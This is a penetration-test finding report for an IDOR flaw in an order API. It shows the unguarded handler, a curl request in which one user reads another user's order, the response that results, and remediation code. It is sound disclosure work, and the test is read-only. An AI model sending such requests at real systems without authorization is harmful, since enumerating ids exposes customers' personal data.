# PoC: [F-001] IDOR — Any user can read any order via sequential id

| | |
|---|---|
| **Finding ID** | F-001 |
| **Severity** | Critical |
| **CVSS** | 8.1 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Category** | IDOR / Broken Access Control |
| **Affected Endpoint(s)** | `GET /api/v1/orders/{id}`, `GET /api/v1/orders/{id}/invoice` |
| **Non-destructive** | Yes (read-only proof) |

---

## 1. Summary
The order retrieval handler returns any order by its integer id without verifying
ownership. Order ids are sequential, so any authenticated user can enumerate and
read every customer's orders and invoices, exposing PII at scale.

## 2. Code Evidence (SAST — confirmed statically)
**File:** `src/controllers/orders.controller.js` **Line:** 42 **Function:** `getOrder`
```js
async function getOrder(req, res) {
  const order = await Order.findById(req.params.id);
  if (!order) return res.status(404).json({ error: 'order not found' });
  return res.json(order); // no ownership check
}
```
**Data flow:** `req.params.id -> Order.findById(id) -> res.json(order)`
**Missing check:** `if (order.owner_id !== req.user.id && !req.user.isAdmin) return res.status(404).end();`

The validator independently re-traced this path and confirmed no authorization
middleware is attached to this route in `src/routes/orders.routes.js`, and the
same unguarded `Order.findById()` pattern repeats at line 88 (`/invoice`).

> Everything below this line is written for a **human** to execute manually
> against a live/staging instance. No agent in this pipeline sent any of these
> requests — see `START-HERE.md` §0.

## 3. Prerequisites
- Two regular user accounts: `userA` (attacker, id 88) and `userB` (victim, id 77).
- `userB` has at least one order (id `1002`).
- Tooling: `curl` (or Burp Suite).

## 4. Manual Test Steps (human-executed)
1. Authenticate as **userB** and place/observe an order; note its id `1002`.
2. Authenticate as **userA** and capture the bearer token.
3. As **userA**, request **userB's** order:
   ```http
   GET /api/v1/orders/1002 HTTP/1.1
   Host: api.acme.example
   Authorization: Bearer REDACTED_USER_A_TOKEN
   ```
   ```bash
   curl -i 'https://api.acme.example/api/v1/orders/1002' -H 'Authorization: Bearer REDACTED_USER_A_TOKEN'
   ```
4. Observe that **userB's** order is returned to **userA** — confirms the bug:
   ```http
   HTTP/1.1 200 OK
   Content-Type: application/json

   {"id": 1002, "owner_id": 77, "customer": "userB", "total": 129.00}
   ```
5. Control — request `GET /api/v1/orders/999999` (nonexistent) and observe
   `404`, confirming step 4 is genuine cross-user access, not a generic error.

## 5. Impact
Any authenticated user can read every customer's orders and invoices by
incrementing the id, exposing names, addresses, order history, and totals.
This is a large-scale privacy breach with GDPR/PCI implications and reputational risk.

## 6. Remediation
```js
// Enforce ownership on every object-by-id route
const order = await Orders.findById(req.params.id);
if (!order || (order.owner_id !== req.user.id && !req.user.isAdmin)) {
  return res.status(404).end(); // do not reveal existence
}
return res.json(order);
```
- Apply the same check to `/invoice` and any nested order resources.
- Add automated tests that assert userA cannot read userB's objects.
- Consider non-sequential, unguessable ids (UUIDs) as defense-in-depth (not a
  substitute for authorization).

## 7. References
- OWASP A01:2025 — Broken Access Control
- CWE-639 — Authorization Bypass Through User-Controlled Key
- OWASP WSTG-ATHZ-04 — Testing for IDOR